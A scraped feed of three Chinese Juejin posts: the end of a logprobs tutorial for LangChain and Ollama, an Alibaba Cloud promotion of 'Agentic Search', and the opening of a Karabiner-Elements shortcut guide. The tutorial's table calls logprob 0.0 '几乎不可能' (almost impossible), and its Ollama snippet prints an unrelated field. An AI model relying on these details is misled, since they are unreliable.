<span class="hljs-comment"># response.response_metadata 中包含 logprobs 信息</span>
print(response.response_metadata<span class="hljs-section">["logprobs"]</span>)
</code></pre>
<blockquote>
<p>⚠️ 注意：不是所有 LangChain LLM 封装都支持此参数（如 <code>ChatOllama</code> 目前不直接暴露 logprobs）。</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">📉 <code>logprob</code> 数值解读</h2>



































<table><thead><tr><th>logprob 值</th><th>概率（approx）</th><th>含义</th></tr></thead><tbody><tr><td><code>0.0</code></td><td>100%</td><td>确定性极高（几乎不可能）</td></tr><tr><td><code>-0.1</code></td><td>~90%</td><td>非常自信</td></tr><tr><td><code>-1.0</code></td><td>~37%</td><td>中等置信</td></tr><tr><td><code>-3.0</code></td><td>~5%</td><td>低置信，可能出错</td></tr><tr><td><code>-10.0</code></td><td>~0.0045%</td><td>几乎随机猜测</td></tr></tbody></table>
<blockquote>
<p>💡 公式：<code>probability = exp(logprob)</code></p>
</blockquote>
<hr/>
<h2 data-id="heading-8">⚠️ 注意事项</h2>
<ol>
<li><strong>性能开销</strong><br/>
启用 <code>logprobs</code> 会略微增加推理时间和响应体积。</li>
<li><strong>并非所有 token 都返回</strong><br/>
有些 API 只对 <strong>新生成的 token</strong> 返回 logprobs，不包括 prompt。</li>
<li><strong>本地模型支持有限</strong><br/>
Ollama 默认不返回 logprobs，需修改底层调用（如直接 POST 到 <code>/api/generate</code> 并设 <code>"options": {"logprobs": 5}</code>）。</li>
</ol>
<hr/>
<h2 data-id="heading-9">✅ 总结</h2>

























<table><thead><tr><th>问题</th><th>答案</th></tr></thead><tbody><tr><td><strong><code>logprobs</code> 是什么？</strong></td><td>每个输出 token 的对数概率</td></tr><tr><td><strong>有什么用？</strong></td><td>评估置信度、自定义生成、检测幻觉、RLHF 等</td></tr><tr><td><strong>如何启用？</strong></td><td>在模型调用时设置 <code>logprobs=True</code>（或类似参数）</td></tr><tr><td><strong>本地模型（如 Llama3）支持吗？</strong></td><td>Ollama 部分支持，需查具体后端；Hugging Face 完全支持</td></tr></tbody></table>
<hr/>
<p>如果你正在使用 <strong>Ollama + Llama3.1</strong> 并想获取 logprobs，可以这样尝试（直接调用 Ollama API）：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests

response = requests.post(
    <span class="hljs-string">"http://localhost:11434/api/generate"</span>,
    json={
        <span class="hljs-string">"model"</span>: <span class="hljs-string">"llama3.1"</span>,
        <span class="hljs-string">"prompt"</span>: <span class="hljs-string">"Hello"</span>,
        <span class="hljs-string">"options"</span>: {<span class="hljs-string">"logprobs"</span>: <span class="hljs-number">3</span>},  <span class="hljs-comment"># 返回 top-3 logprobs</span>
        <span class="hljs-string">"stream"</span>: <span class="hljs-literal">False</span>
    }
)
<span class="hljs-built_in">print</span>(response.json()[<span class="hljs-string">"context"</span>])  <span class="hljs-comment"># 注意：Ollama 的 logprobs 在 "eval_count" 等字段中，结构较复杂</span>
</code></pre>
<blockquote>
<p>🔍 Ollama 的 logprobs 支持仍在演进中，建议查看最新文档。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agentic Search: AI驱动的下一代企业搜索]]></title>    <link>https://juejin.cn/post/7595414148486873128</link>    <guid>https://juejin.cn/post/7595414148486873128</guid>    <pubDate>2026-01-15T10:28:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595414148486873128" data-draft-id="7595131688940257320" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agentic Search: AI驱动的下一代企业搜索"/> <meta itemprop="keywords" content="搜索引擎"/> <meta itemprop="datePublished" content="2026-01-15T10:28:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="阿里云大数据AI技术"/> <meta itemprop="url" content="https://juejin.cn/user/2414974667341287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agentic Search: AI驱动的下一代企业搜索
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2414974667341287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    阿里云大数据AI技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T10:28:59.000Z" title="Thu Jan 15 2026 10:28:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e50ef8bdea48cbbda2cf9b2a679231~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077739&amp;x-signature=DyLQbqIfJgNDM5cHs%2FDmb%2Be6qoo%3D" alt="" loading="lazy"/><br/>
<img alt="" title="点击并拖拽以移动" src="" loading="lazy"/></p>
<h2 data-id="heading-0">背景介绍</h2>
<p>在生成式 AI 浪潮与 LLM 模型能力飞速演进的推动下，一场深刻的技术范式革命正在重塑我们与信息获取交互方式。搜索，这一信息智能化工作的基石，正经历着从“信息检索工具”到“AI 搜索自主智能执行入口”的根本性蜕变。</p>
<p>传统的搜索架构，以关键词匹配和链接列表为核心，将信息筛选、整合分析与最终决策的认知负荷完全交给了用户。然而，在真实的企业工作流与生产场景中，我们面临的挑战远比简单的信息查询更为复杂和开放。我们的目标不再是“找到一份文档”，而是要“全自动化完成一项任务”、“得出一个可行性结论”或“生成一份可交付的成果”。</p>
<p>为此，我们全新升级推出 OpenSearch 产品系列-主动智能洞察 Agent 产品 Agentic Search。Agentic Search 是一种以自主智能体（Agent）为核心驱动，以信息检索与整合为坚实基础的革命性架构。它将搜索、推理、规划和工具调用四种能力深度融合，构建了一个完整的“理解-规划-执行-反馈”闭环。它同时整合了此前的“OpenSearch LLM 智能问答版”已具备强大的深度检索（Deep Search）与研究整合（Deep Research）能力。</p>
<p>这意味着，AI 时代的搜索不再是被动地响应指令，而是转变为一个能够主动执行任务的AI智能伙伴。它能够深刻理解复杂意图，自主地将宏大任务拆解为一系列可执行步骤，并智能调用必要的内部系统或外部工具来完成每一步，最终呈现一个完整的、可直接使用的结果。</p>
<p>通过 Agentic Search 产品，我们希望引领企业搜索跨越从“被动响应”到“主动执行”的鸿沟，全链路覆盖从简单问答到深度执行的每一个环节，最终将企业知识库从静态的信息孤岛，彻底激活为驱动业务增长的动态潜能。</p>
<h3 data-id="heading-1">Demo 展示</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.video.taobao.com%2Fvod%2F6fkBKrt23wasAF9bx2TURMRUML0ePPJHnAvX1zAOhrM.mp4" target="_blank" title="https://cloud.video.taobao.com/vod/6fkBKrt23wasAF9bx2TURMRUML0ePPJHnAvX1zAOhrM.mp4" ref="nofollow noopener noreferrer">cloud.video.taobao.com/vod/6fkBKrt…</a></p>
<h2 data-id="heading-2">核心亮点</h2>
<h3 data-id="heading-3">Agentic驱动的全新搜索范式：从“被动响应”到“自主执行”的飞跃</h3>
<p>Agentic Search 的核心变革在于引入了“智能体（Agent）”作为基本能力单元。这不再是简单的功能叠加，而是一次架构层面的范式转移，赋予了搜索前所未有的自主性与能动性。其具备四大核心能力：</p>
<p><strong>深度意图理解与自主任务执行</strong></p>
<p>超越关键词的表层匹配，Agentic Search 能够深刻理解您提出的模糊、复杂甚至开放式的业务目标（例如，“分析本季度主要竞品的市场策略变化”），并将其精确地抽象为可执行的任务。</p>
<p><strong>多步骤智能推理与动态规划</strong></p>
<p>面对复杂任务，Agentic Search 能够像人类专家一样进行逻辑推理，自主地将宏观目标拆解为一系列具体的、有序的行动步骤。这一规划过程是动态的，可根据中间步骤的结果实时调整后续策略，确保任务路径的最优化。</p>
<p><strong>多工具协同与生态调用</strong></p>
<p>Agentic Search 是企业数字化生态的“超级连接器”。它能智能判断如：何时需要查询专业数据库，或何时需要联网获取最新资讯等，并协同这些智能工具自主无缝调用企业工作，以完成仅靠自身模型无法完成的任务。</p>
<p><strong>多模态感知与理解能力</strong></p>
<p>多模态处理能力可分析与理解非结构化的现实世界数据。视觉理解能够识别图像或视频中的物体、理解空间关系、读取 OCR 文本，甚至分析视频中的动态事件。文档多模态解析能力同时处理 PDF 中的文字、复杂表格和统计图表，实现“所见即所查”。</p>
<p><strong>结果信息智能整合与多元化呈现</strong></p>
<p>Agentic Search 最终交付的不再是零散的信息碎片。其会将所有执行步骤的结果进行深度整合、去伪存真，并以需要的格式进行输出——可能是一份结构化的分析报告、一个可视化的数据图表，或是一段代码等。</p>
<h3 data-id="heading-4">三种模式，覆盖从问答到复杂任务执行的全链路需求</h3>
<p>Agentic Search 提供了一个灵活且强大的多模式框架，无缝覆盖从快速信息获取到深度战略分析的应用场景，确保在任何情境下都能提供最优的交互体验与执行效率。</p>
<p><strong>对话模式</strong></p>
<p>为即时性、高频次的问答场景而生。当您需要快速获取一个精准答案时，该模式将以秒级响应速度，融合内部知识库与全网公开信息，提供最直接、最准确的解答。</p>
<p><strong>规划模式</strong></p>
<p>专为处理复杂、多维度的战略性任务而设计。当您的目标需要多步推理、跨系统数据整合与深度分析时，该模式将启动完整的“理解-规划-执行-整合”工作流，自主完成从数据采集到洞察呈现的全过程。</p>
<p><strong>自适应模式</strong></p>
<p>这是 Agentic Search 的智慧核心。系统将基于对用户意图复杂度的实时评估，智能判断并自动选择最优的工作模式。用户无需关心背后是“对话”还是“规划”，只需提出问题，系统便会以最高效的方式交付最佳结果，实现真正的无感智能体验。</p>
<h2 data-id="heading-5">产品架构</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45f79d85fa574892b27d45cb63dd1db7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769077739&amp;x-signature=cwE%2FvAfpnFcnex5V52ie0xB0Bag%3D" alt="" loading="lazy"/></p>
<p>该架构通过智能路由、双模驱动、Agent 规划与多工具协同，构建了一个从理解意图到交付成果的全链路自动化系统。</p>
<p><strong>智能前端与决策中枢</strong></p>
<p>问题路由: 该模块会对用户意图的复杂度进行实时评估，智能判断应采用最高效的处理路径：是需要快速响应的直接问答，还是需要深度分析的复杂任务。</p>
<p><strong>双模式处理路径</strong></p>
<p>对话模式: 对于清晰、直接的问题，系统将激活此模式。它通过意图识别快速锁定用户目标，并调用部分轻量级工具（如知识库查询、联网搜索）以提供即时、精准的答案。</p>
<p>规划模式: 当面对开放式、多步骤的复杂目标时，系统进入此模式。用户的宏观指令被传递给核心的 Planning Agent。</p>
<p><strong>核心规划与执行单元</strong></p>
<p>Planning Agent: 这是整个系统的“总指挥”。它负责对复杂任务进行分析、拆解与分配，将其转化为一个由多个子任务组成的、逻辑清晰的执行计划。</p>
<p>强大的工具集: Planning Agent 通过工具调用机制，指挥一个强大的工具集来执行具体的子任务。</p>
<p>闭环反馈: 每个工具执行的结果都会返回给 Planning Agent，后者根据反馈动态调整后续的计划，展现出真正的智能和适应性。</p>
<p><strong>成果整合与输出</strong></p>
<p>Report Agent: Planning Agent 将任务的执行结果和核心洞察，移交给“报告智能体”。这个角色负责将信息进行整合、提炼与美化。最终，系统以结构化的、多元化的格式（如Markdown或HTML报告）向用户交付一个完整的、可直接使用的成果。</p>
<h2 data-id="heading-6">功能介绍</h2>
<h3 data-id="heading-7">大模型驱动的智能核心：精准意图理解与自主任务规划</h3>
<p>Agentic Search 的智慧大脑，由开源领域全球第一的通义千问模型家族驱动。这一强大的模型内核，为产品注入了强大的认知能力，确保在每一个交互环节都能精准洞悉用户意图。在智能问题路由、复杂任务拆解、深层意图识别等核心环节进行深度优化，确保 Agentic Search 真正“听懂”您的每一个指令，并以此为起点，精准地完成您的目标。</p>
<p><strong>丰富SubAgent工具集</strong></p>
<p>Agentic Search 的强大执行力，源于其内置的一个全面且高度协同的工具集。这些工具使其能够突破语言模型的限制，与数字世界进行深度交互，完成各类复杂任务。</p>
<p><strong>多模态智能体</strong></p>
<p>Agentic Search 能够深度解析包括 PDF、Word、PPT、图片等在内的多种非结构化与半结构化文档。它不仅仅是读取文本，更能理解其中的表格、图表和布局，将静态文档转化为可供分析的动态数据。</p>
<p><strong>企业知识库检索</strong></p>
<p>Agentic Search 可无缝集成您现有的 Elasticsearch（ES）或 OpenSearch（OS）实例，构建企业专属知识库。通过先进的向量检索与 RAG 检索增强生成技术，Agentic Search 能够在回答问题与知识获取时，优先且精准地引用与分析您内部的业务数据、流程文档等，确保答案结果实现高度贴合企业实际、安全可信。</p>
<p><strong>CodeAgent代码智能体</strong></p>
<p>它拥有一个安全隔离的代码执行环境，能够自主编写并运行代码脚本，以执行复杂的数据处理、数值计算、统计分析和格式转换等任务。</p>
<p><strong>联网搜索</strong></p>
<p>当内部知识无法满足需求，或任务需要最新的公开信息时，Agentic Search 会智能启动集成的联网搜素工具，安全地访问互联网。这使其能够获取实时新闻动态、最新的政策法规、权威的技术文档等，为决策提供最新鲜的视角。</p>
<p><strong>网络爬虫</strong></p>
<p>针对需要广泛收集特定领域网页信息的任务，如大规模市场调研、全网竞品价格与功能监测、舆情动态追踪等，Agentic Search 可部署定制化爬虫，自动化、结构化地批量抓取目标网站数据。</p>
<p><strong>浏览器代理</strong></p>
<p>内置的浏览器代理能够模拟真实用户的点击、滚动、登录等操作。这使得 Agentic Search 可以亲自”访问和操作需要交互才能获取信息的网站，例如在电商平台进行多维度商品比价等。</p>
<h3 data-id="heading-8">多元化输出</h3>
<p>为满足不同场景下的汇报与使用需求，Agentic Search 内置了强大的报告生成工具，支持多种输出格式</p>
<p><strong>Markdown 格式:</strong> 详尽全面，保留所有分析过程、数据来源和推理步骤，适合需要深度溯源和存档的严谨分析场景。</p>
<p><strong>HTML 格式:</strong> 视觉丰富，通过图表、表格和高亮文本，将复杂的分析结果以清晰、直观、易于理解的形式呈现，适用于管理层汇报、跨部门沟通等场景。</p>
<h2 data-id="heading-9">应用场景</h2>
<p><strong>深度研究</strong></p>
<p>面对行业研究、市场调研、竞品分析等复杂课题，Agentic Search 相当于一支智能研究团队。用户只需提出总体需求，智能代理就会自动拆解研究任务——例如收集市场趋势、整理竞品资料、分析数据并撰写报告等，并综合多来源信息给出全面结果。整个执行过程借助多步推理与专业工具自动完成，大幅提高研究工作的效率和深度。</p>
<p><strong>智能客服与问答助手</strong></p>
<p>面向客户支持与服务场景，Agentic Search 支持接入企业 ES/OS 实例知识库、FAQ 文档等内部数据源，可用于全天候智能客服代理和问答助手。这种统一智能代理的形式能支持24*7制用户响应，大幅提升终端用户体验以及大幅降低企业人力成本，实现了问题的一站式解决。</p>
<p><strong>企业生产力提效</strong></p>
<p>Agentic Search 可以作为企业员工的效率助理，承担许多耗时耗力的信息整合和报告生成任务。例如，它可以根据指定条件汇总数据，生成周报/月报等，或者从企业文件和业务数据库中抓取关键信息，直接输出分析结果。通过将海量分散的数据转化为可行动的洞见，Agentic Search 赋能企业员工提升生产效率，为企业实现更高效的组织管理。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Karabiner-Elements 豆包语音输入一键启停操作手册]]></title>    <link>https://juejin.cn/post/7595311405750845486</link>    <guid>https://juejin.cn/post/7595311405750845486</guid>    <pubDate>2026-01-15T06:09:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595311405750845486" data-draft-id="7595157651619823642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Karabiner-Elements 豆包语音输入一键启停操作手册"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-15T06:09:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="学习非暴力沟通的程序员"/> <meta itemprop="url" content="https://juejin.cn/user/4183005583377070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Karabiner-Elements 豆包语音输入一键启停操作手册
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4183005583377070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    学习非暴力沟通的程序员
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T06:09:11.000Z" title="Thu Jan 15 2026 06:09:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Karabiner-Elements 豆包语音输入一键启停操作手册</h2>
<h3 data-id="heading-1">一、手册说明</h3>
<p>适用场景：解决豆包客户端语音输入需按两组快捷键的繁琐问题，通过工具实现一键呼出、一键关闭。</p>
<p>适用系统：macOS 全版本（Ventura/Sonoma/Sequoia 兼容）</p>
<p>核心效果：单键触发豆包原生语音快捷键（Option+Space），一键启停，全局生效无冲突。</p>
<h3 data-id="heading-2">二、为何选择 Karabiner-Elements</h3>
<ol>
<li>系统级响应：内核层运行，0延迟触发，优于脚本类工具；</li>
<li>精准匹配需求：原生支持“单键映射组合键”，完美实现核心诉求；</li>
<li>轻量稳定：免费开源，占用内存少，配置持久化，重启不丢失；</li>
<li>无侵入兼容：仅模拟按键操作，不修改豆包，版本更新不受影响。</li>
</ol>
<h3 data-id="heading-3">三、前置准备</h3>
<ol>
<li>确认豆包语音快捷键：默认<strong>Option+Space</strong>（一键启停，按两次分别控制呼出/关闭）；</li>
